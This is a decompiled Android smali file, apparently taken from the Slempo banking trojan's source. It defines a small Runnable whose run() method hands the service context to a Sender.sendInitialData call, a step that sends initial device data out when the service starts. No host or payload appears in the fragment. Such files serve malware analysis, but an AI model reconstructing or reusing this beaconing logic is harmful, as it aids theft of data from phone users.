.class Lorg/slempo/service/MainService$1;
.super Ljava/lang/Object;
.source "MainService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lorg/slempo/service/MainService;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lorg/slempo/service/MainService;


# direct methods
.method constructor <init>(Lorg/slempo/service/MainService;)V
    .locals 0
    .param p1, "this$0"    # Lorg/slempo/service/MainService;

    .prologue
    .line 68
    iput-object p1, p0, Lorg/slempo/service/MainService$1;->this$0:Lorg/slempo/service/MainService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 1

    .prologue
    .line 71
    iget-object v0, p0, Lorg/slempo/service/MainService$1;->this$0:Lorg/slempo/service/MainService;

    invoke-static {v0}, Lorg/slempo/service/MainService;->access$000(Lorg/slempo/service/MainService;)Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lorg/slempo/service/utils/Sender;->sendInitialData(Landroid/content/Context;)V

    .line 72
    return-void
.end method
